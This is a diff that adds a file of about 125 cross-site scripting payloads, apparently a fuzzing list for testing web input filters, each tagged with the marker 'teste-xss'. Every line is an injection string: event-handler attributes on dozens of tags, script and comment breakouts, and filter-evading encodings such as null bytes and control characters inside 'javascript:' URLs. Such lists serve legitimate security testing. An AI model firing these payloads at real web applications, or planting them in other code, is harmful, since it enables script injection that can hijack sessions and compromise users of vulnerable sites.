@@ -1,0 +1,125 @@
+"-prompt(teste-xss)-"
+'-prompt(teste-xss)-'
+'-eval("window['pro'%2B'mpt'](teste-xss)")-'
+"-eval("window['pro'%2B'mpt'](teste-xss)")-"
+"onclick=prompt(teste-xss)>"@x.y
+"onclick=prompt(teste-xss)><svg/onload=prompt(teste-xss)>"@x.y
+<image/src/onerror=prompt(teste-xss)>
+<img/src/onerror=prompt(teste-xss)>
+<image src/onerror=prompt(teste-xss)>
+<img src/onerror=prompt(teste-xss)>
+<image src =q onerror=prompt(teste-xss)>
+<img src =q onerror=prompt(teste-xss)>
+'"><svg/onload%3Dalert("teste-xss")%3B>
+</scrip</script>t><img src =q onerror=prompt(teste-xss)>
+</scrip</script>t><img src =q onerror=prompt(teste-xss)>
+<script\x20type="text/javascript">javascript:alert(teste-xss);</script>
+<script\x3Etype="text/javascript">javascript:alert(teste-xss);</script>
+<script\x0Dtype="text/javascript">javascript:alert(teste-xss);</script>
+<script\x09type="text/javascript">javascript:alert(teste-xss);</script>
+<script\x0Ctype="text/javascript">javascript:alert(teste-xss);</script>
+<script\x2Ftype="text/javascript">javascript:alert(teste-xss);</script>
+<script\x0Atype="text/javascript">javascript:alert(teste-xss);</script>
+'`"><\x3Cscript>javascript:alert(teste-xss)</script>        
+'`"><\x00script>javascript:alert(teste-xss)</script>
+<img src=teste-xss href=teste-xss onerror="javascript:alert(teste-xss)"></img>
+<audio src=teste-xss href=teste-xss onerror="javascript:alert(teste-xss)"></audio>
+<video src=teste-xss href=teste-xss onerror="javascript:alert(teste-xss)"></video>
+<body src=teste-xss href=teste-xss onerror="javascript:alert(teste-xss)"></body>
+<image src=teste-xss href=teste-xss onerror="javascript:alert(teste-xss)"></image>
+<object src=teste-xss href=teste-xss onerror="javascript:alert(teste-xss)"></object>
+<script src=teste-xss href=teste-xss onerror="javascript:alert(teste-xss)"></script>
+<svg onResize svg onResize="javascript:javascript:alert(teste-xss)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(teste-xss)"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(teste-xss)"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(teste-xss)"></body onMouseEnter>
+<body onFocus body onFocus="javascript:javascript:alert(teste-xss)"></body onFocus>
+<frameset onScroll frameset onScroll="javascript:javascript:alert(teste-xss)"></frameset onScroll>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(teste-xss)"></script onReadyStateChange>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(teste-xss)"></html onMouseUp>
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(teste-xss)"></body onPropertyChange>
+<svg onLoad svg onLoad="javascript:javascript:alert(teste-xss)"></svg onLoad>
+<body onPageHide body onPageHide="javascript:javascript:alert(teste-xss)"></body onPageHide>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(teste-xss)"></body onMouseOver>
+<body onUnload body onUnload="javascript:javascript:alert(teste-xss)"></body onUnload>
+<body onLoad body onLoad="javascript:javascript:alert(teste-xss)"></body onLoad>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(teste-xss)"></bgsound onPropertyChange>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(teste-xss)"></html onMouseLeave>
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(teste-xss)"></html onMouseWheel>
+<style onLoad style onLoad="javascript:javascript:alert(teste-xss)"></style onLoad>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(teste-xss)"></iframe onReadyStateChange>
+<body onPageShow body onPageShow="javascript:javascript:alert(teste-xss)"></body onPageShow>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(teste-xss)"></style onReadyStateChange>
+<frameset onFocus frameset onFocus="javascript:javascript:alert(teste-xss)"></frameset onFocus>
+<applet onError applet onError="javascript:javascript:alert(teste-xss)"></applet onError>
+<marquee onStart marquee onStart="javascript:javascript:alert(teste-xss)"></marquee onStart>
+<script onLoad script onLoad="javascript:javascript:alert(teste-xss)"></script onLoad>
+<html onMouseOver html onMouseOver="javascript:javascript:alert(teste-xss)"></html onMouseOver>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(teste-xss)"></html onMouseEnter>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(teste-xss)"></body onBeforeUnload>
+<html onMouseDown html onMouseDown="javascript:javascript:alert(teste-xss)"></html onMouseDown>
+<marquee onScroll marquee onScroll="javascript:javascript:alert(teste-xss)"></marquee onScroll>
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(teste-xss)"></xml onPropertyChange>
+<frameset onBlur frameset onBlur="javascript:javascript:alert(teste-xss)"></frameset onBlur>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(teste-xss)"></applet onReadyStateChange>
+<svg onUnload svg onUnload="javascript:javascript:alert(teste-xss)"></svg onUnload>
+<html onMouseOut html onMouseOut="javascript:javascript:alert(teste-xss)"></html onMouseOut>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(teste-xss)"></body onMouseMove>
+<body onResize body onResize="javascript:javascript:alert(teste-xss)"></body onResize>
+<object onError object onError="javascript:javascript:alert(teste-xss)"></object onError>
+<body onPopState body onPopState="javascript:javascript:alert(teste-xss)"></body onPopState>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(teste-xss)"></html onMouseMove>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(teste-xss)"></applet onreadystatechange>
+<body onpagehide body onpagehide="javascript:javascript:alert(teste-xss)"></body onpagehide>
+<svg onunload svg onunload="javascript:javascript:alert(teste-xss)"></svg onunload>
+<applet onerror applet onerror="javascript:javascript:alert(teste-xss)"></applet onerror>
+<body onkeyup body onkeyup="javascript:javascript:alert(teste-xss)"></body onkeyup>
+<body onunload body onunload="javascript:javascript:alert(teste-xss)"></body onunload>
+<iframe onload iframe onload="javascript:javascript:alert(teste-xss)"></iframe onload>
+<body onload body onload="javascript:javascript:alert(teste-xss)"></body onload>
+<html onmouseover html onmouseover="javascript:javascript:alert(teste-xss)"></html onmouseover>
+<object onbeforeload object onbeforeload="javascript:javascript:alert(teste-xss)"></object onbeforeload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(teste-xss)"></body onbeforeunload>
+<body onfocus body onfocus="javascript:javascript:alert(teste-xss)"></body onfocus>
+<body onkeydown body onkeydown="javascript:javascript:alert(teste-xss)"></body onkeydown>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(teste-xss)"></iframe onbeforeload>
+<iframe src iframe src="javascript:javascript:alert(teste-xss)"></iframe src>
+<svg onload svg onload="javascript:javascript:alert(teste-xss)"></svg onload>
+<html onmousemove html onmousemove="javascript:javascript:alert(teste-xss)"></html onmousemove>
+<body onblur body onblur="javascript:javascript:alert(teste-xss)"></body onblur>
+\x3Cscript>javascript:alert(teste-xss)</script>
+'"`><script>/* *\x2Fjavascript:alert(teste-xss)// */</script>
+<script>javascript:alert(teste-xss)</script\x0D
+<script>javascript:alert(teste-xss)</script\x0A
+<script>javascript:alert(teste-xss)</script\x0B
+<script charset="\x22>javascript:alert(teste-xss)</script>
+<!--\x3E<img src=xxx:x onerror=javascript:alert(teste-xss)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(teste-xss)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(teste-xss)> -->
+--><!-- --\x2teste-xss> <img src=xxx:x onerror=javascript:alert(teste-xss)> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(teste-xss)> -->
+`"'><img src='#\x27 onerror=javascript:alert(teste-xss)>
+<a href="javascript\x3Ajavascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+"'`><p><svg><script>a='hello\x27;javascript:alert(teste-xss)//';</script></p>
+<a href="javas\x00cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x00cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x07cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x0Dcript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x0Acript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x08cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x02cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x03cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x01cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x05cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x0Bcript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x09cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x06cript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<a href="javas\x0Ccript:javascript:alert(teste-xss)" id="fuzzelementteste-xss">test</a>
+<script>/* *\x2A/javascript:alert(teste-xss)// */</script>
+<script>/* *\x00/javascript:alert(teste-xss)// */</script>
+<style></style\x3E<img src="about:blank" onerror=javascript:alert(teste-xss)//></style>
+<style></style\x0D<img src="about:blank" onerror=javascript:alert(teste-xss)//></style>
+<style></style\x09<img src="about:blank" onerror=javascript:alert(teste-xss)//></style>
+<style></style\x20<img src="about:blank" onerror=javascript:alert(teste-xss)//></style>
+<style></style\x0A<img src="about:blank" onerror=javascript:alert(teste-xss)//></style>
